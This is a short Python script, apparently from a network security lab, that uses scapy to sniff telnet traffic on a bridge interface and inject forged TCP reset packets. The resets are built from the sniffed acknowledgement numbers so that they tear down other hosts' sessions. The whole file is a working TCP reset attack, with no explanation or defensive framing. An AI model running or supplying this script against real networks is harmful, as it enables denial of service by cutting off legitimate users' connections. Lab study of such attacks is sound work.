#!/usr/bin/env python3
from scapy.all import *
from random import getrandbits

def drop_pkt(pkt):
    # Checks that packet is an acknowledgement packet
    if not pkt[IP][TCP].payload:
        newpkt = IP()/TCP()
        newpkt[IP].src = pkt[IP].dst
        newpkt[IP].dst = pkt[IP].src
        newpkt[TCP].sport = pkt[TCP].dport
        newpkt[TCP].dport = pkt[TCP].sport        
        newpkt[TCP].flags = 'R'
        newpkt[TCP].seq = pkt[TCP].ack
        newpkt[TCP].ack = 0
        send(newpkt, verbose=0)
    
sniff(iface = 'br-fee11e059dc7', filter = 'tcp dst port 23 && (not ether host 02:42:e4:2c:cc:83)', prn = drop_pkt)
